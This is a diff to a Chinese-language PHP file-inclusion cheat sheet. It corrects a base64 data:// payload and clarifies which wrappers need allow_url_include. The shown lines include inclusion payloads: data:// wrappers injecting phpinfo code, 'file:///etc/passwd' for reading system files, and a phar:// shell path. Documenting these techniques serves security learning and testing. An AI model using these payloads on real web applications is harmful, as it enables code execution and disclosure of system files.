@@ -301,7 +301,7 @@ $file = 'data://text/plain,<?php phpinfo();?>';
 ```shell
 # 数据流
 'data://text/plain,<?php phpinfo();?>'
-'data://test/plain;base64,PD9waHAgcGhwaW5mbygpOz8='
+'data://text/plain;base64,PD9waHAgcGhwaW5mbygpOz8+'
 
 # 本地文件（主要是为了兼容性，和直接用文件路径效果相同）
 'file:///etc/passwd'
@@ -315,7 +315,7 @@ $file = 'data://text/plain,<?php phpinfo();?>';
 'phar://shell.phar/shell.php'
 ```
 
-封装协议能否使用取决于`allow_url_fopen`和`allow_url_include`配置，`data://`需要两个都设置为True，`file://`和`php://filter`不需要
+`data://`需要启用`allow_url_fopen`和`allow_url_include`配置；`file://`和`php://filter`不需要
 
 # 操作系统
 
